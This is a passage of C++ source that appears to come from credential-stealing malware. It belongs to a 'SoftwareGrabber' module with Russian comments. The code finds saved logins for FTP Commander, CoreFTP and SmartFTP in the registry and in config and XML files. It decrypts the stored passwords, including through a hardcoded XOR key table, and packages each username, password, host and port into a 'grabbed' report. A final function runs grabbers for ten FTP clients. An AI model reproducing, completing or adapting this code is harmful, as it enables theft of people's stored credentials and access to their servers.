            LPSTR port = CWA(shlwapi, StrStrIA)(list[i], valuePort);
            LPSTR user = CWA(shlwapi, StrStrIA)(list[i], valueUser);
            LPSTR pass = CWA(shlwapi, StrStrIA)(list[i], valuePass);

            if(host != NULL && user != NULL && pass != NULL)
            {
              host += 8; user += 6; pass += 10;

              ftpFtpCommanderMarkStringEnd(host);              
              ftpFtpCommanderMarkStringEnd(user);
              ftpFtpCommanderMarkStringEnd(pass);
              
              DWORD portNum = 0;
              if(port != NULL)
              {
                port += 6;
                ftpFtpCommanderMarkStringEnd(port);
                portNum = Str::_ToInt32A(port, NULL);
              }
              if(portNum < 1 || portNum > 0xFFFF)portNum = 21;

              if(*host != 0 && *user != 0 && *pass != 0 && ftpFtpCommanderDecrypt(pass) > 0)
              {
                CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1A);
                int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, portNum);
                if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
              }
            }
          }
          
          Mem::free(output);
          Mem::freeArrayOfPointers(list, listSize);
        }

        Fs::_closeMemFile(&mf);
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpFtpCommander(void)
{
  CSTR_GETW(dir1, softwaregrabber_fc_path_mask_1);
  const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
  const LPWSTR dirs[] = {dir1};
  WCHAR curPath[MAX_PATH];
  FTPDATA ftpData;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
  {
    Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFtpCommanderProc, &ftpData, NULL, 0, 0);
  }

  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_fc_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// CoreFTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpCoreFtpDecrypt(LPWSTR pass)
{
  //FIXME:AES
  return Str::_LengthW(pass);
}

void SoftwareGrabber::_ftpCoreFtp(void)
{
  FTPDATA ftpData;
  Mem::_zero(&ftpData, sizeof(FTPDATA));

  const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
  LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

  if(dataBuf != NULL)
  {
    HKEY rootKey;
    WCHAR name[MAX_PATH];
    const HKEY locs[] = {HKEY_CURRENT_USER};

    LPWSTR host    = dataBuf;
    LPWSTR user    = host + MAX_ITEM_SIZE;
    LPWSTR pass    = user + MAX_ITEM_SIZE;
    LPWSTR output  = pass + MAX_ITEM_SIZE;

    CSTR_GETW(regKey, softwaregrabber_coreftp_regkey);
    CSTR_GETW(valueHost, softwaregrabber_coreftp_host);
    CSTR_GETW(valuePort, softwaregrabber_coreftp_port);
    CSTR_GETW(valueUser, softwaregrabber_coreftp_user);
    CSTR_GETW(valuePass, softwaregrabber_coreftp_pass);

    for(DWORD i = 0; i < sizeof(locs) / sizeof(HKEY); i++)if(CWA(advapi32, RegOpenKeyExW)(locs[i], regKey, 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
    {
      DWORD index = 0;
      DWORD size = MAX_PATH;
      DWORD port;

      while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
      {
        if((size = Registry::_getValueAsString(rootKey, name, valueHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           (size = Registry::_getValueAsString(rootKey, name, valueUser, user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           (size = Registry::_getValueAsString(rootKey, name, valuePass, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
           ftpCoreFtpDecrypt(pass) > 0)
        {
          port = Registry::_getValueAsDword(rootKey, name, valuePort);
          if(port < 1 || port > 0xFFFF)port = 21;
          
          CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
          int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
          if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))ftpData.count++;
        }
        size = MAX_PATH;
      }
      CWA(advapi32, RegCloseKey)(rootKey);
    }

    Mem::free(dataBuf);

    //FIXME: coreftp.cfg

    if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_coreftp_title, BLT_GRABBED_FTPSOFTWARE);
    else Mem::free(ftpData.list);
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// SmartFTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass - пароль.

  Return      - размер пароля.
*/
static int ftpSmartFtpDecrypt(LPWSTR pass)
{
  const WCHAR hardcode[] = {0xE722, 0xF62F, 0xB67C, 0xDD5A, 0x0FDB, 0xB94E, 0x5196, 0xE040, 0xF694, 0xABE2, 0x21BB, 0xFC08, 0xE48E, 0xB96A, 0x55D7, 0xA6E5, 0xA4A1, 0x2172, 0x822D, 0x29EC,
                            0x57E4, 0x1458, 0x04D1, 0x9DC1, 0x7020, 0xFC6A, 0xED8F, 0xEFBA, 0x8E88, 0xD689, 0xD18E, 0x8740, 0xA6DE, 0x8e01, 0x3AC2, 0x6871, 0xEE11, 0x8C2A, 0x5FC1, 0x337F,
                            0x6D32, 0xD471, 0x7DC9, 0x0cD9, 0x5071, 0xA094, 0x1605, 0x6FD7, 0x3638, 0x4FFD, 0xB3B2, 0x9717, 0xBECA, 0x721C, 0x623F, 0x068F, 0x698F, 0x7FFF, 0xE29C, 0x27E8,
                            0x7189, 0x4939, 0xDB4E, 0xC3FD, 0x8F8B, 0xF4EE, 0x9395, 0x6B1A, 0xD1B1, 0x0F6A, 0x4D8B, 0xA696, 0xA79D, 0xBB9E, 0x00DF, 0x093C, 0x856F, 0xB51C, 0xF1C5, 0xE83D,
                            0x393A, 0x03D1, 0x68D8, 0x9659, 0xF791, 0xB2C2, 0x0234, 0x9B5C, 0xB1BF, 0x72EB, 0xDABA, 0xF1C5, 0xDA01, 0xF047, 0x3DD8, 0x72AB, 0x784C, 0x0077, 0xB05F, 0xA245,
                            0x1794, 0x16D9, 0xC6C6, 0xFFA2, 0xF099, 0x3D88, 0xA624, 0xDE3D, 0xD35B, 0x82B3, 0x7E9C, 0xF406, 0x1608, 0x07AA, 0xF97E, 0x373A, 0xC441, 0x15B0, 0xB699, 0xF81C,
                            0xE38F, 0xCB97};
  WCHAR buf[sizeof(hardcode) / sizeof(WCHAR) + 1/*safebyte*/];

  int len = Str::_LengthW(pass) / 4;
  if(len < (sizeof(buf) / sizeof(WCHAR)) && Str::_fromHexW(pass, buf))
  {
    for(int i = 0; i < len; i++)
    {
      WORD sw = SWAP_WORD(buf[i]);
      sw ^= hardcode[i];
      pass[i] = SWAP_WORD(sw);
    }
    pass[len] = 0;
    return len;
  }
  return 0;
}

bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpSmartFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
  CSTR_GETW(file1, softwaregrabber_smartftp_file_mask_1);
  const LPWSTR files[] = {file1};
  Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpSmartFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
  FTPDATA *ftpData = (FTPDATA *)data;
  WCHAR curPath[MAX_PATH];

  if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
  {
    WDEBUG1(WDDT_INFO, "%s", curPath);
    if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)ftpSmartFtpBasicSearch(curPath, ftpData);
    else
    {      
      IXMLDOMDocument *doc = XmlParser::_openFile(curPath, NULL);
      if(doc != NULL)
      {
        IXMLDOMElement *root;
        if(doc->get_documentElement(&root) == S_OK)
        {
          BSTR rootName;
          if(root->get_nodeName(&rootName) == S_OK)
          {
            CSTR_GETW(nodeName, softwaregrabber_smartftp_node);
            if(Str::_CompareW(rootName, nodeName, -1, CryptedStrings::len_softwaregrabber_smartftp_node - 1) == 0)
            {
              BSTR host;
              BSTR port;
              BSTR user;
              BSTR pass;

              {
                CSTR_GETW(nodeHost, softwaregrabber_smartftp_host);
                host = XmlParser::_getNodeTextOfElement(root, nodeHost);
              }
              {
                CSTR_GETW(nodePort, softwaregrabber_smartftp_port);
                port = XmlParser::_getNodeTextOfElement(root, nodePort);
              }
              {
                CSTR_GETW(nodeUser, softwaregrabber_smartftp_user);
                user = XmlParser::_getNodeTextOfElement(root, nodeUser);
              }
              {
                CSTR_GETW(nodePass, softwaregrabber_smartftp_pass);
                pass = XmlParser::_getNodeTextOfElement(root, nodePass);
              }

              if(host != NULL && *host != 0 && user != NULL && *user != 0 && pass != NULL && ftpSmartFtpDecrypt(pass) > 0)
              {
                DWORD portInt = port != NULL ? Str::_ToInt32W(port, NULL) : 0;
                if(portInt < 1 || portInt > 0xFFFF)portInt = 21;
                
                LPWSTR output = NULL;
                CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
                int outputSize = Str::_sprintfExW(&output, reportFormat, user, pass, host, portInt);
                if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))ftpData->count++;
                Mem::free(output);
              }

              XmlParser::_freeBstr(host);
              XmlParser::_freeBstr(port);
              XmlParser::_freeBstr(user);
              XmlParser::_freeBstr(pass);
            }
            XmlParser::_freeBstr(rootName);
          }
          root->Release();
        }
        doc->Release();
      }
    }
  }
  return true;
}

void SoftwareGrabber::_ftpSmartFtp(void)
{
  WCHAR inPath[MAX_PATH];
  WCHAR curPath[MAX_PATH];
  FTPDATA ftpData;
  DWORD size;

  Mem::_zero(&ftpData, sizeof(FTPDATA));

  {
    CSTR_GETW(regKey1,   softwaregrabber_smartftp_regkey_1);
    CSTR_GETW(regKey2,   softwaregrabber_smartftp_regkey_2);
    CSTR_GETW(regValue1, softwaregrabber_smartftp_regvalue_1);
    CSTR_GETW(regValue2, softwaregrabber_smartftp_regvalue_2);
  
    const LPWSTR keys[]   = {regKey1, regKey2};
    const LPWSTR values[] = {regValue1, regValue2};
  
    for(BYTE i = 0; i < sizeof(keys) / sizeof(LPWSTR); i++)
    {
      if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, keys[i], values[i], inPath, MAX_PATH)) != (DWORD)-1 && size > 0)
      {
        CWA(kernel32, ExpandEnvironmentStringsW)(inPath, curPath, MAX_PATH);
        ftpSmartFtpBasicSearch(curPath, &ftpData);
      }
    }
  }

  if(ftpData.count > 0)writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_smartftp_title, BLT_GRABBED_FTPSOFTWARE);
  else Mem::free(ftpData.list);
}

void SoftwareGrabber::_ftpAll(void)
{
  _ftpFlashFxp3();
  //_ftpCuteFtp();
  _ftpTotalCommander();
  _ftpWsFtp();
  _ftpFileZilla();
  _ftpFarManager();
  _ftpWinScp();
  _ftpFtpCommander();
  _ftpCoreFtp();
  _ftpSmartFtp();
}
#endif
